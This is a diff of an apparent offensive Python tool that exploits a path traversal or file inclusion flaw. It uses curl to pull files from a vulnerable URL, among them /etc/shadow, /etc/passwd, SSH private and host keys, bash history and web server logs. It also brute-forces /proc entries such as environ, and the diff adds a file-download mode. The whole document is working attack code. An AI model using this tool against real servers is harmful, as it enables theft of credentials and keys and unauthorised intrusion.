@@ -23,13 +23,17 @@ ENDC = '\033[0m'
 BOLD = '\033[1m'
 UNDERLINE = '\033[4m'
 
-commonFiles = [	"/etc/issue","/proc/version","/etc/profile","/etc/bashrc", "~/.bash_profile", "~./bashrc", "~/.bash_logout",
+commonFiles = [	"/etc/issue","/etc/motd","/etc/resolv.conf","/proc/version","/etc/profile","/etc/bashrc", "~/.bash_profile", "~./bashrc", 
+				"~/.bash_logout","/etc/mtab","/etc/inetd.conf","/var/log/dmessage", "/etc/httpd/logs/acces_log", "/etc/httpd/logs/error_log", 
+				"/var/www/logs/access_log", "/var/www/logs/access.log", "/usr/local/apache/logs/access_ log", "/usr/local/apache/logs/access. log" ,
+				"/var/log/apache/access_log" , "/var/log/apache2/access_log" , "/var/log/apache/access.log" , "/var/log/apache2/access.log",
+				"/var/log/access_log",
 	     	   	"/etc/services","/etc/passwd", "/etc/group", "/etc/shadow", "~/.bash_history", "~/.profile","~/.ssh/authorized_keys",
 		 		"~/.ssh/identity.pub", "~/.ssh/identity", "~/.ssh/id_rsa.pub", "~/.ssh/id_rsa", "~/.ssh/id_dsa.pub", "~/.ssh/id_dsa",
 				"/etc/ssh/ssh_config", "/etc/ssh/sshd_config","/etc/ssh/ssh_host_dsa_key.pub", "/etc/ssh/ssh_host_dsa_key",
 			 	"/etc/ssh/ssh_host_rsa_key.pub", "/etc/ssh/ssh_host_rsa_key", "/etc/ssh/ssh_host_key.pub", "/etc/ssh/ssh_host_key"]
 
-procNames = ["cmdline","cwd","environ","fd","root"]
+procNames = ["cmdline","cwd","environ","fd","root", "version", "mounts"]
 
 Header = BLUE + BOLD + """
 ===============================================================================================================================
@@ -62,9 +66,36 @@ if __name__ == "__main__":
 		with open('vulnUrl.txt','w') as file:
 			file.write(url) 
 
-	if sys.argv[-1] == "--brute-force-proc" or sys.argv[-1] == "-bf":
+	if "--download" in sys.argv or "-d" in sys.argv:
+		path = sys.argv[-1]
+		command = "curl {}{} > {}".format(url, path, path.split('/')[-1])
+		print_with_colors("Downloading the file: {}                     ".format(path),BLUE, end="\r")
+		os.popen(command).read()
+		result = open('{}'.format(path.replace('/','_')),'r')
+		# I include this try /except for binary files
+		# to avoid triggering a bug
+		try:
+			if result.read().strip() == '':
+				print('\nEmpty file')
+				os.system('rm {}'.format(path.replace('/','_')))
+		except:
+			pass
+		result.close()
+		quit()
+
+	if "--brute-force-proc" in sys.argv or "-bf" in sys.argv:
+		try:
+			pos = sys.argv.index('--brute-force-proc')
+		except:
+			pos = sys.argv.index('-bf')
+
+		try:
+			maxPID = sys.argv[pos+1]
+		except:
+			print_with_colors("Error: the /proc brute force should be used as: -bf [maxPID]",FAIL)
+		
 		with open("trReport.txt","w") as file:
-			for i in range(int(sys.argv[-2])):
+			for i in range(int(maxPID)):
 				if i == 0:
 					PID = "self"
 				else:
@@ -86,9 +117,10 @@ if __name__ == "__main__":
 		with open("trReport.txt","w") as file:	
 			for path in commonFiles:
 				command = "curl -s {}{}".format(url, path)
-				print_with_colors("Getting the content of the file: {}".format(path),BLUE)
+				print_with_colors("Getting the content of the file: {}                     ".format(path),BLUE, end="\r")
 				result = os.popen(command).read()
 				if result.strip() != '':
+					print("\nFound something !")
 					file.write(BLUE + "\nContent of the file:{}\n===========================\n".format(path) + ENDC)
 					file.write(result)
 	else:
